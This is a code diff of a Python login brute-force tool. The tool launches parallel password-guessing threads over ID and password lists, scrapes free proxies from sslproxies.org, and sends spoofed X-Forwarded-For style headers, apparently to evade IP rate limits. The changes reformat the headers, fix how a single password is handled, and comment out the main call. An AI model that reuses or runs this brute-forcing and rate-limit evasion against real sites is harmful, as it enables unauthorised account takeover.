@@ -4,15 +4,15 @@ from bs4 import BeautifulSoup
 import argparse
 
 headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml",
-        "Cookie": "session=xAxPv4Zwe9rMb9wCLsbOqXI3CVvPzPu5",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "X-Originating-IP": "127.0.0.1",
-        "X-Forwarded-For": "127.0.0.1",
-        "X-Remote-IP": "127.0.0.1",
-        "X-Remote-Addr": "127.0.0.1",
-    }
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml",
+    "Cookie": "session=xAxPv4Zwe9rMb9wCLsbOqXI3CVvPzPu5",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "X-Originating-IP": "127.0.0.1",
+    "X-Forwarded-For": "127.0.0.1",
+    "X-Remote-IP": "127.0.0.1",
+    "X-Remote-Addr": "127.0.0.1"
+}
 
 def sendreq(url, passw, uid, isPresent, isAbsent):
     res = ""
@@ -32,9 +32,6 @@ def sendreq(url, passw, uid, isPresent, isAbsent):
         print("pass-",passw)
 
 
-
-    
-
 def getIPs():
     response = requests.get("https://sslproxies.org/") 
     soup = BeautifulSoup(response.content, 'html5lib') 
@@ -49,6 +46,7 @@ def bruteforce(url, idList, passList, isPresent, isAbsent):
     for uid in idList:
         T =[]
         for passw in passList:
+            
             t = threading.Thread(target=sendreq, args=(url, passw, uid, isPresent, isAbsent))
             t.start()
             T.append(t)
@@ -62,7 +60,7 @@ def readFile(fileName):
         return items
 
 def main():
-    parser = argparse.ArgumentParser(description='Process some integers.')
+    parser = argparse.ArgumentParser()
     parser.add_argument('--url', '-u',
                          action='store',
                          required=True,
@@ -94,7 +92,7 @@ def main():
     passwords = []
     ids = []
     if options.password:
-        ids = [options.password]
+        passwords = [options.password]
     else:
         passwords = readFile(options.password_file)
     
@@ -107,4 +105,5 @@ def main():
     bruteforce(url, ids, passwords, isPresent, isNotPresent)
 
 if __name__=="__main__":
-    main()
+    #main()
+    pass
